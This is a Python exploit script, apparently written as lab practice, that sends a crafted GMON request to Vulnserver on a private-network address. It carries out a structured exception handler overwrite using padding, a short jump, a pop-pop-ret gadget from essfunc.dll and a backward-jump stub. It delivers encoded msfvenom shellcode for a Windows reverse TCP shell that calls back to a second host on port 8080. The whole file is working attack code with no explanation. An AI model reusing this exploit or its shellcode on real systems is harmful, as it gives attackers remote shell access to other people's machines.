#!/usr/bin/python

import socket

target = "192.168.1.121"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))

# nseh offset at 3495
payload = "A" * 2600
payload += "\x90" * 400

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.120 LPORT=8080 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00" -f py
payload += "\xb8\x5b\x3c\xbb\xd9\xda\xc5\xd9\x74\x24\xf4\x5b\x31"
payload += "\xc9\xb1\x52\x31\x43\x12\x83\xc3\x04\x03\x18\x32\x59"
payload += "\x2c\x62\xa2\x1f\xcf\x9a\x33\x40\x59\x7f\x02\x40\x3d"
payload += "\xf4\x35\x70\x35\x58\xba\xfb\x1b\x48\x49\x89\xb3\x7f"
payload += "\xfa\x24\xe2\x4e\xfb\x15\xd6\xd1\x7f\x64\x0b\x31\x41"
payload += "\xa7\x5e\x30\x86\xda\x93\x60\x5f\x90\x06\x94\xd4\xec"
payload += "\x9a\x1f\xa6\xe1\x9a\xfc\x7f\x03\x8a\x53\x0b\x5a\x0c"
payload += "\x52\xd8\xd6\x05\x4c\x3d\xd2\xdc\xe7\xf5\xa8\xde\x21"
payload += "\xc4\x51\x4c\x0c\xe8\xa3\x8c\x49\xcf\x5b\xfb\xa3\x33"
payload += "\xe1\xfc\x70\x49\x3d\x88\x62\xe9\xb6\x2a\x4e\x0b\x1a"
payload += "\xac\x05\x07\xd7\xba\x41\x04\xe6\x6f\xfa\x30\x63\x8e"
payload += "\x2c\xb1\x37\xb5\xe8\x99\xec\xd4\xa9\x47\x42\xe8\xa9"
payload += "\x27\x3b\x4c\xa2\xca\x28\xfd\xe9\x82\x9d\xcc\x11\x53"
payload += "\x8a\x47\x62\x61\x15\xfc\xec\xc9\xde\xda\xeb\x2e\xf5"
payload += "\x9b\x63\xd1\xf6\xdb\xaa\x16\xa2\x8b\xc4\xbf\xcb\x47"
payload += "\x14\x3f\x1e\xc7\x44\xef\xf1\xa8\x34\x4f\xa2\x40\x5e"
payload += "\x40\x9d\x71\x61\x8a\xb6\x18\x98\x5d\x79\x74\xa3\xe5"
payload += "\x11\x87\xa3\x0a\x72\x0e\x45\x5e\x62\x47\xde\xf7\x1b"
payload += "\xc2\x94\x66\xe3\xd8\xd1\xa9\x6f\xef\x26\x67\x98\x9a"
payload += "\x34\x10\x68\xd1\x66\xb7\x77\xcf\x0e\x5b\xe5\x94\xce"
payload += "\x12\x16\x03\x99\x73\xe8\x5a\x4f\x6e\x53\xf5\x6d\x73"
payload += "\x05\x3e\x35\xa8\xf6\xc1\xb4\x3d\x42\xe6\xa6\xfb\x4b"
payload += "\xa2\x92\x53\x1a\x7c\x4c\x12\xf4\xce\x26\xcc\xab\x98"
payload += "\xae\x89\x87\x1a\xa8\x95\xcd\xec\x54\x27\xb8\xa8\x6b"
payload += "\x88\x2c\x3d\x14\xf4\xcc\xc2\xcf\xbc\xed\x20\xc5\xc8"
payload += "\x85\xfc\x8c\x70\xc8\xfe\x7b\xb6\xf5\x7c\x89\x47\x02"
payload += "\x9c\xf8\x42\x4e\x1a\x11\x3f\xdf\xcf\x15\xec\xe0\xc5"
payload += "\x90" * (3495 - len(payload))

# jmp short +8
payload += "\xEB\x06\x90\x90"

# 0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
payload += "\xb4\x10\x50\x62"

# jmp 768 positions behind
payload += "\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1"
payload += "D" * (5000 - len(payload))

s.send("GMON /.:/" + payload + "\n")
s.close()
